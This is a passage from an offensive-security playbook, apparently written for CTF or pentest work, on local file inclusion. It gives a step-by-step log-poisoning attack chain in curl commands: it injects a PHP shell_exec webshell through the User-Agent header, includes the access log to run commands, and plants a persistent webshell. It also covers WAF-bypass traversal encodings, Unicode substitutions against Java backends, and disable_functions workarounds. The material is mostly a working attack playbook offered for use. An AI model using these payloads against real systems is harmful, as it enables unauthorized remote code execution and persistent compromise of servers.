...
- [upload insecure files](./upload-insecure-files.md) when the primary attack surface is an upload workflow rather than an include or read primitive
- [ghost-bits-cast-attack](./ghost-bits-cast-attack.md) when the target is a **Java backend** (Spring, Jetty, Undertow, Vert.x) and standard `../`, `%2e%2e`, `%252e` chains are WAF-blocked — Ghost Bits substitutes `.` with `阮` (U+962E) and `/` with `阯` (U+962F), re-enabling traversal through Spring CVE-2025-41242 and Jetty `%2>` hex-folding
...
# 补充：日志投毒完整操作序列（中文，融合自 wgpsec/AboutSecurity `lfi-rfi`）

## 四步攻击链（严格按序，每步验证）

```bash
# Step 1: 确认 LFI 能读日志（用 curl 不用 browser！逐个试日志路径）
curl -s "http://target/vuln.php?file=../../../../../../var/log/nginx/access.log" | head -5
# 响应应含 GET /xxx HTTP/1.1 日志行；WAF 过滤时用 ....// 双写

# Step 2: User-Agent 注入 PHP（payload 必须一次正确——失败会污染日志！）
curl -s "http://target/" -H "User-Agent: <?php echo shell_exec(\$_GET['cmd']); ?>"
# ⚠️ shell 中 $ 必须转义 \$_GET，否则 bash 展开变量毁掉 payload

# Step 3: 包含日志执行命令
curl -s "http://target/vuln.php?file=....//....//var/log/nginx/access.log&cmd=id"
# 响应应含 uid=33(www-data)

# Step 4: 读 flag + 写持久 webshell（不再依赖日志）
...
| 症状 | 原因 | 解决 |
|------|------|------|
| 200 但 Content-Length: 0 | payload 语法错误，include 解析失败 | 日志已污染，换 error.log 或换方法 |
| `$_GET` 变空 | bash 没转义 `$` | `\$_GET` 或单引号包裹 |
| 日志找不到 | 路径不对 | 遍历 nginx/apache2/httpd 的 access/error.log |
| 注入成功但无命令输出 | disable_functions | `file_get_contents()` 读文件，或 mail()+LD_PRELOAD |
| 目录遍历被 WAF 拦 | `../` 检测 | `....//`、`..%2f`、URL 双编码 |

## 经典陷阱（必读）

- **不要 `system('cat /file.php')`**：`cat` 输出的 `<?php ?>` 会被 PHP 再次解析 → 语法错误 → 输出为空。**必须 `echo file_get_contents('/FLAG.php')`** 读原始字符串。
- 一旦注入错误 payload，该日志文件即报废 —— 每次 include 都会解析坏 PHP。
- **`file_exists()` 对 PHP stream wrapper 返回 false**：目标先 `file_exists()` 再 `include()` 时 wrapper 不可用，只能走日志投毒。
- Payload 优先级：webshell（`shell_exec($_GET['cmd'])`）> 读 flag（`file_get_contents`）> 单命令。
